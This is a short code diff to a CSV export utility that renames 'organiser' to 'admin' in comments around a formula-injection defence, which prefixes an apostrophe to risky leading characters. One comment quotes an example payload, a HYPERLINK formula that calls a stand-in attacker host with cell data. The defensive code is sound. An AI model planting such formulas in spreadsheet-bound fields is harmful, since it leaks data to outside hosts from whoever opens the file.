@@ -1,5 +1,5 @@
 /**
- * A CSV an organiser can open in a spreadsheet.
+ * A CSV an admin can open in a spreadsheet.
  *
  * Quoting is unconditional rather than only-when-needed: allergies and notes are
  * free text that will contain commas, quotes and newlines, and a rule applied
@@ -21,7 +21,7 @@ const FORMULA_STARTS = ['=', '+', '-', '@', '\t', '\r']
  * CSV quoting does **not** help: Excel, LibreOffice and Sheets all evaluate a
  * leading `=` inside quotes. Every field exported here is member-editable free
  * text, so `=HYPERLINK("https://evil.example/"&A2,"Click")` in someone's notes
- * becomes a live link in the organiser's spreadsheet. A leading apostrophe is
+ * becomes a live link in the admin's spreadsheet. A leading apostrophe is
  * the conventional fix — spreadsheets consume it and show the text as typed.
  */
 const defuse = (text: string) => (FORMULA_STARTS.some((start) => text.startsWith(start)) ? `'${text}` : text)
